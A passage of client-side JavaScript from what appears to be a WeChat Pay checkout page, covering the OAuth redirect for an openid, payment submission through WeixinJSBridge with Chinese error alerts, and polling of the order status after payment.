            var url = new URL(window.location.href);
            url.searchParams.delete('code');
            url.searchParams.delete('state');
            url.searchParams.set('auto_pay', '1');
            var redirectUri = encodeURIComponent(url.toString());
            var oauthBase = 'https://open.weixin.qq.com';
            if (window.__wxOauthMode === '1' && window.__wxOauthUrl) {
                oauthBase = window.__wxOauthUrl.replace(/\/$/, '');
            }
            var authUrl = oauthBase + '/connect/oauth2/authorize?appid=' + appid + '&redirect_uri=' + redirectUri + '&response_type=code&scope=snsapi_base&state=wxpay#wechat_redirect';
            window.location.replace(authUrl);
        }
        return;
    }

    var btn = document.querySelector('#btn-pay-submit, .cp-btn-pay, [onclick*="submitPay"]');
    if (btn) { btn.disabled = true; btn.textContent = '支付中...'; }

    fetch('/api/pay/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            trade_no: window.__tradeNo,
            tpl: window.__tpl,
            openid: openid,
        })
    })
    .then(function(r) { return r.json(); })
    .then(function(res) {
        if (res.code === 0 && res.data) {
            if (res.data.jsapi_params) {
                if (typeof WeixinJSBridge === 'undefined') {
                    alert('请在微信中打开此页面完成支付');
                    if (btn) { btn.disabled = false; btn.textContent = '确认支付'; }
                    return;
                }
                WeixinJSBridge.invoke(
                    'getBrandWCPayRequest',
                    {
                        appId: res.data.jsapi_params.appId,
                        timeStamp: res.data.jsapi_params.timeStamp,
                        nonceStr: res.data.jsapi_params.nonceStr,
                        package: res.data.jsapi_params.package,
                        signType: res.data.jsapi_params.signType,
                        paySign: res.data.jsapi_params.paySign,
                    },
                    function(payRes) {
                        if (payRes.err_msg === 'get_brand_wcpay_request:ok') {
                            setTimeout(function() { window.location.reload(); }, 1500);
                        } else if (payRes.err_msg === 'get_brand_wcpay_request:cancel') {
                            if (btn) { btn.disabled = false; btn.textContent = '确认支付'; }
                        } else {
                            alert('支付失败，请重试');
                            if (btn) { btn.disabled = false; btn.textContent = '确认支付'; }
                        }
                    }
                );
            } else if (res.data.pay_url) {
                window.location.href = res.data.pay_url;
            } else {
                alert('支付方式异常');
                if (btn) { btn.disabled = false; btn.textContent = '确认支付'; }
            }
        } else {
            alert(res.msg || '支付发起失败');
            if (btn) { btn.disabled = false; btn.textContent = '确认支付'; }
        }
    })
    .catch(function(e) {
        alert('网络错误: ' + (e.message || '请检查网络连接'));
        if (btn) { btn.disabled = false; btn.textContent = '确认支付'; }
    });
}

// =============================================
// 支付结果轮询（支付完成后回来自动刷新状态）
// =============================================
if (window.__orderData && window.__orderData.status == 0) {
    var pollCount = 0;
    var pollTimer = setInterval(function() {
        pollCount++;
        if (pollCount > 10) { clearInterval(pollTimer); return; } // 最多轮询10次
        fetch('/api/order?trade_no=' + window.__tradeNo)
            .then(function(r) { return r.json(); })
            .then(function(res) {
                if (res.code === 0 && res.data && res.data.status == 1) {
                    clearInterval(pollTimer);
                    window.location.reload(); // 刷新页面显示已支付
                }
            })
            .catch(function() {});
    }, 3000); // 每3秒检查一次
}
</script>
</body>
</html>
